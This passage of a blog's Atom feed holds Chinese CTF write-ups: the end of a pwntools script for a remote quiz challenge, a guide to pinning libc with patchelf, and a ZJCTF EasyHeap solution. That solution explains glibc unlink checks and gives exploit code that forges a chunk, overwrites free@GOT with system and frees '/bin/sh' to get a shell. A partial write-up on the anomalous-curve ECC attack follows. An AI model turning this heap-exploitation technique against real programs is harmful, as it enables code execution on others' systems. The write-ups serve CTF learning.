range(<span class="number">6</span>):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">f&#x27;B<span class="subst">&#123;j&#125;</span> == 1&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Answer: &quot;</span>)</span><br><span class="line">        tmp = io.recvline().strip()[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">if</span>(eval(tmp)==ans[j]):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line">            idx.append(j)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span>(num==<span class="number">0</span>):</span><br><span class="line">            print(<span class="string">&quot;CASE 0&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&quot;1 == 1&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;Answer: &quot;</span>)</span><br><span class="line">            tmp = io.recvline().strip()[:<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span>(eval(tmp)):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span>(num==<span class="number">1</span>):</span><br><span class="line">            print(<span class="string">&quot;CASE 1&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">0</span>):</span><br><span class="line">                io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">                io.sendline(<span class="string">&quot;1 == 1&quot;</span>)</span><br><span class="line">                io.recvuntil(<span class="string">&quot;Answer: &quot;</span>)</span><br><span class="line">                tmp = io.recvline().strip()[:<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">if</span>(eval(tmp)):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">1</span>):</span><br><span class="line">                io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">                io.sendline(<span class="string">f&quot;B<span class="subst">&#123;idx[<span class="number">0</span>]&#125;</span> == 1&quot;</span>)</span><br><span class="line">                io.recvuntil(<span class="string">&quot;Answer: &quot;</span>)</span><br><span class="line">                tmp = io.recvline().strip()[:<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">if</span>(eval(tmp)):</span><br><span class="line">                    ans[idx[<span class="number">0</span>]] = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ans[idx[<span class="number">0</span>]] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">f&quot;CASE 2 and num = <span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">f&quot;B<span class="subst">&#123;idx[j]&#125;</span> == 1&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;Answer: &quot;</span>)</span><br><span class="line">            tmp = io.recvline().strip()[:<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span>(eval(tmp)):</span><br><span class="line">                ans[idx[j]] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ans[idx[j]] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    tosend = str(ans)[<span class="number">1</span>:<span class="number">-1</span>].replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Now open the chests:\n&#x27;</span>)</span><br><span class="line">    io.sendline(tosend)</span><br><span class="line">    <span class="comment">#sleep(2)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ecc&quot;&gt;&lt;a href=&quot;#ecc&quot; class=&quot;headerlink&quot; title=&quot;ecc&quot;&gt;&lt;/a&gt;ecc&lt;/h2&gt;&lt;p&gt;通过计算可得知&lt;script type=&quot;math/tex&quot;&gt;((x_3-x_1)^3*4y_1^2+(3x_1^2*(x_3-x_</summary>
      
    
    
    
    
    <category term="crypto" scheme="http://phot0n.com/tags/crypto/"/>
    
    <category term="ctf" scheme="http://phot0n.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>指定libc版本以及unlink[ZJCTF-easyheap]</title>
    <link href="http://phot0n.com/2022/07/04/%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC%E4%BB%A5%E5%8F%8Aunlink-ZJCTF-easyheap/"/>
    <id>http://phot0n.com/2022/07/04/%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC%E4%BB%A5%E5%8F%8Aunlink-ZJCTF-easyheap/</id>
    <published>2022-07-04T14:30:50.000Z</published>
    <updated>2022-07-10T08:46:24.026Z</updated>
    
    <content type="html"><![CDATA[<h2 id="libc版本的指定"><a href="#libc版本的指定" class="headerlink" title="libc版本的指定"></a>libc版本的指定</h2><p>因为远程的libc版本和本地不太一样(远程是2.23，而本地是2.27)，很多特性都不太一样。比如在2.27中很多free之后的chunk会进tcache bin，调试起来也相当麻烦，于是就照着网上的指导把libc文件改了</p><p>主要是下载两个东西，一个叫做<code>patchelf</code>,一个是<code>glibc-all-in-one</code>。我们通过<code>glibc-all-in-one</code>下载我们想要版本的<code>ld.so</code>以及<code>libc.so</code>，然后通过<code>patchelf</code>修改二进制文件所依赖的ld以及libc</p><p>下载好相应的ld以及libc之后，在/lib64目录下创建对ld的链接文件之后，在需要被修改的二进制文件目录下用如下几个命令就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf --set-interpreter [ld.so] [需要被修改的二进制文件]</span><br><span class="line">$ patchelf --replace-needed libc.so.6 [替换的libc] [需要被修改的二进制文件]</span><br><span class="line">$ ldd .&#x2F;bin #查看elf的ld和libc</span><br></pre></td></tr></table></figure></p><h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="ZJCTF 2019 EasyHeap"></a>ZJCTF 2019 EasyHeap</h2><p>第二次做堆的题，这次也是稍微理解了一点，但是估计离自己独立做出还有挺大距离的。不过感觉确实很有意思，在此记录一下自己的理解，如果有错误请务必指出</p><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>unlink是一种操作，其目的是从双向链表当中取出中间的一个元素。当调用free时，经常使用到unlink函数对chunk进行整理，进而对空闲chunk进行合并。一个典型的场景就是当被free的chunk的P位为0的时候，也就是说<code>物理相邻</code>的前一个chunk时空闲的，那么就会对前一个chunk进行unlink操作，取出来之后将这个chunk和当前这个被free的chunk进行后向合并，形成一个大的空闲的chunk。形成之后的大小就是两个chunk之和。</p><p>具体这个unlink的过程可以参考这张图(来自ctf-wiki)</p><p><img src="https://s2.loli.net/2022/07/04/b9fq2PtGVX1x4HB.png" alt="unlink_smallbin_intro.png"></p><p>实现的源代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Take a chunk off a bin list.  *&#x2F;</span><br><span class="line">static void</span><br><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  if (chunksize (p) !&#x3D; prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span><br><span class="line">  mchunkptr fd &#x3D; p-&gt;fd;</span><br><span class="line">  mchunkptr bk &#x3D; p-&gt;bk;</span><br><span class="line">  if (__builtin_expect (fd-&gt;bk !&#x3D; p || bk-&gt;fd !&#x3D; p, 0))</span><br><span class="line">    malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br><span class="line">  fd-&gt;bk &#x3D; bk;</span><br><span class="line">  bk-&gt;fd &#x3D; fd;</span><br><span class="line">  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize !&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (p-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; p</span><br><span class="line">          || p-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; p)</span><br><span class="line">        malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);</span><br><span class="line">      if (fd-&gt;fd_nextsize &#x3D;&#x3D; NULL)</span><br><span class="line">        &#123;</span><br><span class="line">          if (p-&gt;fd_nextsize &#x3D;&#x3D; p)</span><br><span class="line">            fd-&gt;fd_nextsize &#x3D; fd-&gt;bk_nextsize &#x3D; fd;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">              fd-&gt;fd_nextsize &#x3D; p-&gt;fd_nextsize;</span><br><span class="line">              fd-&gt;bk_nextsize &#x3D; p-&gt;bk_nextsize;</span><br><span class="line">              p-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; fd;</span><br><span class="line">              p-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; fd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      else</span><br><span class="line">        &#123;</span><br><span class="line">          p-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; p-&gt;bk_nextsize;</span><br><span class="line">          p-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; p-&gt;fd_nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到主要对被unlink的这个chunk主要作了两个检查<code>大小检查</code>以及<code>指针指向检查</code>如下(其实阅读源码可以发现还做了许多其他的检查，比如针对large chunk的检查)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;大小检查</span><br><span class="line">if (chunksize (p) !&#x3D; prev_size (next_chunk (p))) </span><br><span class="line">    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span><br><span class="line">&#x2F;&#x2F;指针指向检查</span><br><span class="line">if (__builtin_expect (fd-&gt;bk !&#x3D; p || bk-&gt;fd !&#x3D; p, 0))</span><br><span class="line">    malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br></pre></td></tr></table></figure><br>我们首先看大小检查，这个很好理解，就是这个被unlink的chunk的物理相邻的下一个chunk的prev_size要和当前chunk的size一样。同时要知道prev_size只有前一个chunk是空闲的时候才会被置上。</p><p>再看看指针指向的检查，简化出来就是如下几个操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FD &#x3D; P-&gt;fd;</span><br><span class="line">BK &#x3D; P-&gt;bk;</span><br><span class="line"></span><br><span class="line">要满足</span><br><span class="line">FD-&gt;bk &#x3D; P</span><br><span class="line">BK-&gt;fd &#x3D; P</span><br></pre></td></tr></table></figure><br>我们进一步化简，也就是说<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk &#x3D;&#x3D; P &lt;&#x3D;&gt; *(P-&gt;fd + 0x18) &#x3D;&#x3D; P </span><br><span class="line">P-&gt;bk-&gt;fd &#x3D;&#x3D; P &lt;&#x3D;&gt; *(P-&gt;bk + 0x10) &#x3D;&#x3D; P</span><br></pre></td></tr></table></figure><br>因此我们只要将被unlink的这个chunk的<code>fd</code>和<code>bk</code>的指针分别设置为<code>&amp;P-0x18</code>以及<code>&amp;P-0x10</code>即可(64位下)，因为一个chunk的结构从小到大字节分别是<code>prev_size</code>、<code>size</code>、<code>fd</code>、<code>bk</code>，每个都是0x8个字节。<br>当我们绕过之后，执行了这两个语句(不考虑large chunk的情况)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk &#x3D; bk;</span><br><span class="line">bk-&gt;fd &#x3D; fd;</span><br></pre></td></tr></table></figure><br>同时注意到之前的声明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr fd &#x3D; p-&gt;fd;</span><br><span class="line">mchunkptr bk &#x3D; p-&gt;bk;</span><br></pre></td></tr></table></figure><br>对于第一个式子我们可以换算得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    p-&gt;fd-&gt;bk &#x3D; p-&gt;bk</span><br><span class="line">&lt;&#x3D;&gt;*(&amp;p-0x18+0x18) &#x3D;  &amp;p-0x10&#x2F;&#x2F;我们已经设定了p-&gt;fd &#x3D; &amp;p-0x18;p-&gt;bk &#x3D; &amp;p-0x10</span><br><span class="line">&lt;&#x3D;&gt;p &#x3D; &amp;p-0x10</span><br></pre></td></tr></table></figure><br>对于第二个式子同理我们可以换算得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    p-&gt;bk-&gt;fd &#x3D; p-&gt;fd</span><br><span class="line">&lt;&#x3D;&gt;p &#x3D; &amp;p-0x18</span><br></pre></td></tr></table></figure><br>由于后面那个语句后执行，所以最后<code>p = &amp;p-0x18</code></p><p>综上，我们总结一下我们需要做的，以及我们将会得到的<br>我们如果有一个可Use After Free的指针p，我们进行</p><ul><li>修改p-&gt;fd = &amp;p-0x18</li><li>修改p-&gt;bk = &amp;p-0x10</li><li>触发unlink<br>我们将会得到如下结果</li><li>p指针指向了&amp;p-0x18</li></ul><p>通过这个我们就可以对目标地址进行内存写操作，比如修改got表之类的</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>首先IDA反汇编看一下，是一个常见的菜单题</p><p><img src="https://s2.loli.net/2022/07/10/k6dvhXbzBeU2RYQ.png" alt="X1}T6FFEG@~C35KNNRT20%D.png"></p><p>注意到我们只要把<code>bss</code>上面的<code>magic</code>变量修改成大于0x1305的数，就能进入<code>l33t</code>,跟进一下这个函数，发现它的作用是获取flag。但是buuoj上面的环境放置flag的位置和这个不太一样，所以作罢。不过我们可以利用它所给的<code>system</code>函数来getshell</p><p>我们查看<code>edit_heap</code>这个函数可以发现存在堆溢出漏洞</p><p><img src="https://s2.loli.net/2022/07/10/5wdAYuXCIbz9i1D.png" alt="_T_SIGL8XN_0NL65VJQ41_1.png"></p><p>输入的大小是我们自己控制的，并且没有跟本身chunk的大小作检查，所以就会产生溢出。</p><p>这里我们getshell的思路是伪造一个<code>fake chunk</code>，进行<code>unlink</code>操作使得<code>heaparray</code>的元素(本来是指向chunk的指针)更改为指向<code>&amp;heaparry-0x18</code>，然后我们就能再次更改heaparray数组，使其指向<code>free_got</code>,通过利用提供的<code>edit</code>操作，修改<code>chunk</code>(此时已经被修改到了<code>free_got</code>)使<code>free_got</code>的值变成<code>system_plt</code>,然后调用<code>free</code>函数来<code>getshell</code></p><p>当我们构造fake chunk的时候要注意前面提到的对于unlink的检查，首先是大小的检查，那么后面一个相邻的chunk必须通过溢出来修改prev_size，并且后面的PREV_INUSE位也相应的置0，使得前面那个chunk(也就是我们构造的fake chunk)被unlink。此时堆布局如下图所示</p><p><img src="https://s2.loli.net/2022/07/10/MwJyEBjfhpiobmK.png" alt="堆布局"></p><p>此时free掉chunk 1，那么chunk 0就会由于unlink使得原本指向chunk 0的指针指向了<code>&amp;heaparry-0x18</code></p><p><img src="https://s2.loli.net/2022/07/10/HlBKdMn8f7TLer6.png" alt="heaparry"></p><p>那么之后我们就能通过edit来对chunk0进行操作，进而实现任意地址写（我们只需要先覆盖heaparry中的元素为我们想要修改的地址，然后edit相应元素就行了）。我们可以把free_got改成system_plt，然后free掉内容是<code>/bin/sh</code>的chunk(这个我们可以自己创造)就行了。</p><p>关键代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">create(0x90,b&quot;aaaa&quot;)</span><br><span class="line">create(0x90,b&quot;bbbb&quot;)</span><br><span class="line">create(0x20,b&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">heaparry_adr &#x3D; 0x6020e0</span><br><span class="line">system_plt &#x3D; elf.plt[&#39;system&#39;]</span><br><span class="line">free_got &#x3D; elf.got[&#39;free&#39;]</span><br><span class="line">fake_chunk &#x3D; p64(0)+p64(0x91)+p64(heaparry_adr-0x18)+p64(heaparry_adr-0x10)</span><br><span class="line">fake_chunk &#x3D; fake_chunk.ljust(0x90,b&#39;A&#39;)</span><br><span class="line">fake_chunk +&#x3D; p64(0x90) + p64(0xa0)</span><br><span class="line"></span><br><span class="line">edit(0,0x100,fake_chunk)</span><br><span class="line">#debug()</span><br><span class="line">#io.interactive()</span><br><span class="line">delete(1)</span><br><span class="line">payload &#x3D; p64(0)*3+p64(free_got)</span><br><span class="line">edit(0,0x20,payload)</span><br><span class="line">edit(0,8,p64(system_plt))</span><br><span class="line">#debug()</span><br><span class="line">#io.interactive()</span><br><span class="line">delete(2)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;libc版本的指定&quot;&gt;&lt;a href=&quot;#libc版本的指定&quot; class=&quot;headerlink&quot; title=&quot;libc版本的指定&quot;&gt;&lt;/a&gt;libc版本的指定&lt;/h2&gt;&lt;p&gt;因为远程的libc版本和本地不太一样(远程是2.23，而本地是2.27)，很多特性都</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="libc" scheme="http://phot0n.com/tags/libc/"/>
    
    <category term="unlink" scheme="http://phot0n.com/tags/unlink/"/>
    
  </entry>
  
  <entry>
    <title>异常曲线攻击</title>
    <link href="http://phot0n.com/2022/05/08/%E5%BC%82%E5%B8%B8%E6%9B%B2%E7%BA%BF%E6%94%BB%E5%87%BB/"/>
    <id>http://phot0n.com/2022/05/08/%E5%BC%82%E5%B8%B8%E6%9B%B2%E7%BA%BF%E6%94%BB%E5%87%BB/</id>
    <published>2022-05-07T16:00:00.000Z</published>
    <updated>2022-05-08T15:40:36.585Z</updated>
    
    <content type="html"><![CDATA[<p>异常曲线指的是那些点的个数与有限域的阶数(此处只考虑素域)一样的椭圆曲线,对于这类曲线我们有一种攻击方法可以在很快的时间内求得ECDLP。其主要思路是通过群的变换，将椭圆曲线群上的运算同构成$(F_p,+)$，也就是模p的加法群。对于加法群我们可以很容易求得对应得到的ECDLP</p><h2 id="亨泽尔引理"><a href="#亨泽尔引理" class="headerlink" title="亨泽尔引理"></a>亨泽尔引理</h2><p>这些转换中间的纽带是p-进数，其中用到的一个重要工具是亨泽尔引理(Hensel ‘s Lemma)</p><p>设$f(x)$是整系数多项式,$k$为不少于2的整数，$p$为质数。若整数$r$是下面同余式的根</p><script type="math/tex; mode=display">f(r) \equiv 0 \mod p^{k-1}</script><p>对于</p><script type="math/tex; mode=display">f(r+tp^{k-1}) \equiv 0 \mod p^k</script><p>若$f’(r) \not\equiv 0 \mod p$,则存在唯一的$0 \le t \le p-1$使得上式成立。</p><p>当然对于$f’(r) \equiv 0 \mod p$的情况还有其他的结论，这里我们只考虑不等的情况。上式的证明可以用泰勒展开来完成</p><p>通过亨泽尔引理，我们可以完成一种<code>lift</code>，即把平时的模$p$的情况提升到模$p^k$的情况，同时也将相应的$p$的幂的系数给搞出来。通过亨泽尔引理我们可以将$F_p$上的椭圆曲线提升到$Q_p$，也就是p-进数的数域</p><h2 id="p-进数-p-adic-number"><a href="#p-进数-p-adic-number" class="headerlink" title="p-进数(p-adic number)"></a>p-进数(p-adic number)</h2><p>此处对于p-进数作简要的介绍</p><p>对于任意有理数$a$以及素数$p$,可写成$a = p^r \frac{m}{n}$其中$m,n$均与$p$互质。简单地说就是尽量地提取$p$直到提不动。</p><p>我们定义</p><script type="math/tex; mode=display">ord_p(a) = r</script><p>为$a$的阶。对于任意元素$a \in Q_p$,如果$ord_p(a) \ge 0$,那么其被称为p-进整数(p-adic integer)。所有这样的集合称作$Z_p$(注意与$Z / pZ$这个商群区分)</p><p>我们一般将p进数表示成如下形式</p><script type="math/tex; mode=display">c_{-n}p^{-n}+\dots+c_0+c_1p+\dots+c_mp^m+\dots</script><h2 id="椭圆曲线的扩张"><a href="#椭圆曲线的扩张" class="headerlink" title="椭圆曲线的扩张"></a>椭圆曲线的扩张</h2><p>对于一个定义在$F_p$上Weierstrass型的椭圆曲线</p><script type="math/tex; mode=display">y^2+a_1xy+a_3y = x^3+a_2x^2+a_4x+a_6</script><p>如果我们想用其表示有理点，我们可以令$z = -\frac{x}{y},w = -\frac{1}{y}$</p><p>那么方程就转变成</p><script type="math/tex; mode=display">w = z^3 + a_1zw+a_2z^2w+a_3w^2+a_4zw^2+a_6w^3</script><p>我们可以对其不断递归求得$w$关于$z$的表达式</p><script type="math/tex; mode=display">\begin{align}w &= z^3 + (a_1z+a_2z^2)w+(a_3+a_4z)w^2+a_6w^3\\&= z^3 + (a_1z+a_2z^2)(z^3 + (a_1z+a_2z^2)w+(a_3+a_4z)w^2+a_6w^3)+\\&(a_1z+a_2z^2)(z^3 + (a_1z+a_2z^2)w+(a_3+a_4z)w^2+a_6w^3)^2+\\&a_6(z^3 + (a_1z+a_2z^2)w+(a_3+a_4z)w^2+a_6w^3)^3+\dots\\&= z^3+a_1z^4+(a_1^2+a_2)z^5+\dots \end{align}</script><p>将其带入$x,y$得到</p><script type="math/tex; mode=display">\begin{align}    x(z) &= \frac{z}{w(z)} = \frac{1}{z^2}-\frac{a_1}{z}-a_2-a_3-(a_4+a_1a_3)z^2-\dots \\    y(z) &=- \frac{1}{w(z)} =- \frac{1}{z^3}+\frac{a_1}{z^2}-\frac{a_2}{z}+a_3+(a_4+a_1a_3)z^2+\dots\end{align}</script>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;异常曲线指的是那些点的个数与有限域的阶数(此处只考虑素域)一样的椭圆曲线,对于这类曲线我们有一种攻击方法可以在很快的时间内求得ECDLP。其主要思路是通过群的变换，将椭圆曲线群上的运算同构成$(F_p,+)$，也就是模p的加法群。对于加法群我们可以很容易求得对应得到的ECD</summary>
      
    
    
    
    
    <category term="crypto" scheme="http://phot0n.com/tags/crypto/"/>
    
    <category term="ECC" scheme="http://phot0n.com/tags/ECC/"/>
    
  </entry>
  
</feed>
